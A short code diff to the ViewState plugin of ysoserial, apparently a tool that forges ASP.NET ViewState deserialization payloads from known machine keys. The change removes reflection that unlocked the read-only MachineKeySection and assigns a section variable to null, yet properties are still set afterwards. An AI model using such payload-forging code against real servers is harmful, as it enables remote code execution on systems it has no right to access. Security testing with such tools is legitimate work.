@@ -202,9 +202,7 @@ namespace ysoserial.Plugins
             var machineKeySectionType = systemWebAsm.GetType("System.Web.Configuration.MachineKeySection");
             var getApplicationConfigMethod = machineKeySectionType.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
             var config = (MachineKeySection)getApplicationConfigMethod.Invoke(null, emptyArray);
-            var section = (MachineKeySection)ConfigurationManager.GetSection("system.web/machinekey"); //interesting
-            var readOnlyField = typeof(ConfigurationElement).GetField("_bReadOnly", BindingFlags.Instance | BindingFlags.NonPublic);
-            readOnlyField.SetValue(config, false);
+            var section = (MachineKeySection) null; //interesting
             // we don't really need the encryption/decyption keys to create a valid legacy viewstate but this is used when isEncrypted=true
             if (!String.IsNullOrEmpty(decryptionKey) && (!isLegacy || (isLegacy && isEncrypted)))
             {
@@ -222,7 +220,6 @@ namespace ysoserial.Plugins
             }
 	    config.Validation = (MachineKeyValidation)Enum.Parse(typeof(MachineKeyValidation), validationAlg);
             config.ValidationKey = validationKey;
-            readOnlyField.SetValue(config, true);
 
             object finalPayload;
 
